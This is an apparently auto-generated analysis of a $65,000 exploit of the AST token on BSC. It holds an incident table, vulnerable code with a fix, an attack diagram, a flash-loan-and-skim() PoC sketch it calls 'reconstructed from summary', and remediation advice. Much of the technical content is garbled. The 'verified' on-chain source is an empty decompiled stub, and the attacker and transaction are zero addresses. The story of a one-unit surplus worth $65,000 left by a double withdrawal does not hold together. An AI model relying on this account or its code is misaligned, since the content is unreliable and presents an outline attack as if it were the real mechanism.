# AST Token — Double Withdrawal + skim() Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-01-25 |
| **Protocol** | AST Token |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | ~$65,000 |
| **Attacker** | [Unidentified](https://bscscan.com/address/0x0000000000000000000000000000000000000000) |
| **Attack Tx** | [Unidentified](https://bscscan.com/tx/0x0000000000000000000000000000000000000000000000000000000000000000) |
| **Vulnerable Contract** | [0xc10E0319...](https://bscscan.com/address/0xc10E0319337c7F83342424Df72e73a70A29579B2) |
| **Root Cause** | Bug where AST token is withdrawn twice during liquidity removal, leaving the LP balance 1 unit higher than expected; the surplus is extractable via `skim()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-01/Ast_exp.sol) |

---

## 1. Vulnerability Overview

The AST token contract had a bug in its internal logic during liquidity removal operations where tokens were withdrawn twice. Specifically, when 6,688,350,004,594,453,500 AST was added, the LP retained 6,688,350,004,594,453,501 — a discrepancy of 1 unit. The attacker amplified this imbalance by flash-borrowing 30 million BUSD from PancakeSwap V3 to bulk-purchase AST, then extracted the surplus via the `skim()` function, swapped back to BUSD, and stole $65,000.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: double token transfer bug during liquidity removal
function removeLiquidity(uint256 lpAmount) external {
    (uint256 amount0, uint256 amount1) = _calculateAmounts(lpAmount);

    _burn(msg.sender, lpAmount);

    // ❌ Bug: transfer is internally executed twice
    // Additional transfer occurs inside AST token's _transfer hook
    IERC20(token0).transfer(msg.sender, amount0);
    IERC20(token1).transfer(msg.sender, amount1);

    // Result: token0 balance in LP is 1 unit more than amount0
    // This surplus is extractable via skim()
}

// ✅ Safe code: verify actual transfer amount by comparing pre/post balances
function removeLiquidity(uint256 lpAmount) external nonReentrant {
    (uint256 amount0, uint256 amount1) = _calculateAmounts(lpAmount);
    _burn(msg.sender, lpAmount);

    uint256 before0 = IERC20(token0).balanceOf(address(this));
    IERC20(token0).transfer(msg.sender, amount0);
    uint256 after0 = IERC20(token0).balanceOf(address(this));
    // Verify actual amount transferred
    require(before0 - after0 == amount0, "Transfer amount mismatch");
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ASTToken_decompiled.sol
contract ASTToken {
    function balanceOf(address a) external view returns (uint256) {  // ❌ Vulnerability
        // TODO: decompiled logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Flash loan 30M BUSD from PancakeSwap V3
  │
  ├─→ [2] Bulk swap BUSD → AST (received by proxy contract)
  │         └─ Pool AST balance drops sharply, price rises
  │
  ├─→ [3] Trigger liquidity removal operation
  │         └─ Double withdrawal bug triggered
  │            AST added:      6,688,350,004,594,453,500
  │            AST in LP:      6,688,350,004,594,453,501 (+1 unit)
  │
  ├─→ [4] Call skim()
  │         └─ Extract surplus 1 unit of token
  │            (high value due to post-swap elevated price)
  │
  ├─→ [5] Swap extracted AST → BUSD
  │
  ├─→ [6] Repay flash loan
  │
  └─→ [7] ~$65,000 profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Full PoC not available — reconstructed from summary

contract ASTAttacker {
    address constant AST_TOKEN = 0xc10E0319337c7F83342424Df72e73a70A29579B2;
    address constant PANCAKE_V3 = /* PancakeSwap V3 Pool */;
    address constant BUSD = /* BUSD address */;

    function attack() external {
        // [1] Flash loan 30 million BUSD
        IPancakeV3Pool(PANCAKE_V3).flash(
            address(this), 0, 30_000_000e18, ""
        );
    }

    function pancakeV3FlashCallback(...) external {
        // [2] Bulk swap BUSD → AST (received by proxy contract)
        // Swap via specific route to trigger double withdrawal bug
        _swapBUSDForAST(30_000_000e18, proxyContract);

        // [3] Trigger liquidity removal (double withdrawal occurs)
        // LP balance becomes 1 unit more than what was added
        // Added:    6,688,350,004,594,453,500
        // Retained: 6,688,350,004,594,453,501 (1 unit surplus)

        // [4] Extract surplus AST via skim()
        // (1 unit carries significant value due to elevated price)
        IPair(pair).skim(address(this));

        // [5] Swap AST → BUSD
        _swapASTForBUSD();

        // [6] Repay flash loan
        IERC20(BUSD).transfer(PANCAKE_V3, flashAmount + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Token Transfer Hook Error (Double Transfer Bug) |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (Flash Loan + skim() combination) |
| **DApp Category** | Token / AMM |
| **Impact** | $65,000 stolen |

## 6. Remediation Recommendations

1. **Review Transfer Hooks**: Thoroughly audit custom `_transfer` hooks to ensure no reentrancy or double execution occurs
2. **Balance Verification**: Validate actual transfer amounts by comparing pre- and post-transfer balances
3. **Restrict skim() Access**: Restrict the `skim()` function to `onlyOwner` or disable it entirely
4. **Fork-Based Integration Testing**: Fork the live network state to test edge cases such as double transfer bugs

## 7. Lessons Learned

- When integrating custom tokens (fee-on-transfer, rebase, etc.) into AMM pools, transfer hooks must be scrutinized very carefully to ensure they do not cause unexpected side effects.
- The `skim()` function is a normal AMM feature, but when combined with a vulnerability that can intentionally create a balance imbalance, it becomes an attack vector.
- Even a 1-unit discrepancy, when combined with a large-scale flash loan, can result in tens of thousands of dollars in losses.